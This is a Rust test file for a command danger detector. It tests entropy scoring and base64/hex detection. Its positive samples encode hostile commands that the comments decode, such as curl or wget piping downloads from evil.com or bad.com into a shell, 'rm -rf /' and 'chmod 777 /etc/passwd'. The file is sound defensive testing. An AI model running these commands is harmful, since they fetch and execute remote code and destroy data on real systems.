// Copyright 2025 Eric Jingryd (tidynest@proton.me)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use super::super::{*, entropy};

// ========================================================================
// ROUND 3: Entropy Analysis
// ========================================================================

#[test]
fn test_entropy_calculation_low() {
    // Normal commands and text have lower entropy due to patterns
    let test_cases = vec![
        ("firefox", 1.5, 3.5),           // Normal command
        ("alacritty", 2.0, 4.0),         // Longer command
        ("hello world", 2.0, 4.0),       // Natural language (spaces reduce entropy)
        ("aaaaaaaaa", 0.0, 0.1),         // Repetition = very low entropy
        ("/usr/bin/bash", 2.0, 3.5),     // Path with common characters
    ];

    for (input, min_expected, max_expected) in test_cases {
        let entropy_val = entropy::calculate_entropy(input);
        assert!(
            entropy_val >= min_expected && entropy_val <= max_expected,
            "Entropy for '{}' was {:.2}, expected between {:.2} and {:.2}",
            input,
            entropy_val,
            min_expected,
            max_expected
        );
    }
}

#[test]
fn test_entropy_calculation_high() {
    // Updated expectations based on empirical measurements
    // Real-world entropy is MUCH lower than theoretical maximums
    let test_cases = vec![
        // Base64 examples (actual range: 2.5-4.0 bits/char, NOT 6.0)
        ("ZmlyZWZveA==", 2.5, 4.5),      // "firefox" encoded
        ("Y2htb2QgNzc3", 2.5, 4.5),      // "chmod 777" encoded
        ("cm0gLXJmIC8=", 2.5, 4.5),      // "rm -rf /" encoded
        ("SGVsbG8gV29ybGQ=", 2.5, 4.5),  // "Hello World" encoded

        // Hex examples (actual range: 2.0-4.0 bits/char, NOT 4.0)
        // Lower minimum because short hex strings encoding ASCII have very low entropy
        ("48656c6c6f", 1.8, 4.0),          // "Hello" - allows for 2.0
        ("deadbeef1337", 2.0, 4.0),        // Mixed hex
        ("726d202d7266202f", 2.0, 4.0),    // "rm -rf /" - measured at 2.36

        // Random-looking strings (closer to theoretical, but still not maximum)
        ("aB3$dE9#fG2", 3.0, 4.5),
    ];

    for (input, min_expected, max_expected) in test_cases {
        let entropy_val = entropy::calculate_entropy(input);
        assert!(
            entropy_val >= min_expected && entropy_val <= max_expected,
            "Entropy for '{}' was {:.2}, expected between {:.2} and {:.2}",
            input,
            entropy_val,
            min_expected,
            max_expected
        );
    }
}

#[test]
fn test_entropy_edge_cases() {
    // Empty string
    assert_eq!(
        entropy::calculate_entropy(""),
        0.0,
        "Empty string should have zero entropy"
    );

    // Single character (zero entropy - perfectly predictable)
    assert_eq!(
        entropy::calculate_entropy("A"),
        0.0,
        "Single character should have zero entropy"
    );

    // Two different characters (maximum entropy for 2 symbols = 1 bit)
    let entropy_val = entropy::calculate_entropy("AB");
    assert!(
        (entropy_val - 1.0).abs() < 0.01,
        "Two different chars should have ~1 bit entropy, got {:.2}",
        entropy_val
    );
}

#[test]
fn test_base64_detection_heuristic() {
    // Positive cases (should detect as base64)
    // Note: Real-world attack payloads are longer and have higher entropy
    let base64_strings = vec![
        // Real attack: curl http://evil.com/malware | bash
        "Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZSB8IGJhc2g=",
        // Real attack: wget -O- https://bad.com/shell.sh | sh
        "d2dldCAtTy0gaHR0cHM6Ly9iYWQuY29tL3NoZWxsLnNoIHwgc2g=",
        // Real attack: rm -rf / --no-preserve-root
        "cm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290",
    ];

    for text in base64_strings {
        assert!(
            entropy::is_likely_base64(text),
            "String '{}' should be detected as base64 (entropy: {:.2})",
            text,
            entropy::calculate_entropy(text)
        );
    }

    // Negative cases (should NOT detect as base64)
    let non_base64 = vec![
        "firefox",              // Normal text
        "hello",                // Too short
        "rm -rf /",             // Contains spaces (not base64 alphabet)
    ];

    for text in non_base64 {
        assert!(
            !entropy::is_likely_base64(text),
            "String '{}' should NOT be detected as base64",
            text
        );
    }
}

#[test]
fn test_hex_detection_heuristic() {
    // Positive cases (should detect as hex)
    // Note: Real-world hex payloads encoding varied commands have higher entropy
    let hex_strings = vec![
        // Real attack: curl http://evil.com/shell.sh | bash
        "6375726c20687474703a2f2f6576696c2e636f6d2f7368656c6c2e7368207c2062617368",
        // Real attack: wget -O /tmp/mal https://bad.com/trojan
        "77676574202d4f202f746d702f6d616c2068747470733a2f2f6261642e636f6d2f74726f6a616e",
        // Real attack: chmod 777 /etc/passwd
        "63686d6f6420373737202f6574632f706173737764",
    ];

    for text in hex_strings {
        assert!(
            entropy::is_likely_hex(text),
            "String '{}' should be detected as hex (entropy: {:.2})",
            text,
            entropy::calculate_entropy(text)
        );
    }

    // Negative cases (should NOT detect as hex)
    let non_hex = vec![
        "firefox",              // Contains non-hex chars
        "hello",                // Too short
        "GGGG",                 // Not hex alphabet
        "abc",                  // Odd length
    ];

    for text in non_hex {
        assert!(
            !entropy::is_likely_hex(text),
            "String '{}' should NOT be detected as hex",
            text
        );
    }
}

#[test]
fn test_entropy_false_positive_prevention() {
    let detector = DangerDetector::new();

    // Commands with long args but legitimate (should NOT trigger entropy warning)
    let legitimate_commands = vec![
        // Long URLs are high entropy but not necessarily malicious
        "firefox https://docs.rust-lang.org/book/ch10-02-traits.html",
        // File paths can have high entropy
        "nvim /home/user/Documents/project_2024_final_v3.txt",
        // Normal commands with many arguments
        "kitty --session mysession --directory /home/user",
    ];

    for command in legitimate_commands {
        let assessment = detector.assess_command(command);
        // These might be Safe or might trigger other checks,
        // but they shouldn't trigger entropy warnings
        // (because the high-entropy parts are shorter than 8 chars or don't match base64/hex patterns)

        // We just verify they don't crash and return some assessment
        assert!(
            assessment.danger_level == DangerLevel::Safe
                || assessment.danger_level == DangerLevel::Suspicious,
            "Command should be processed without errors: {}",
            command
        );
    }
}
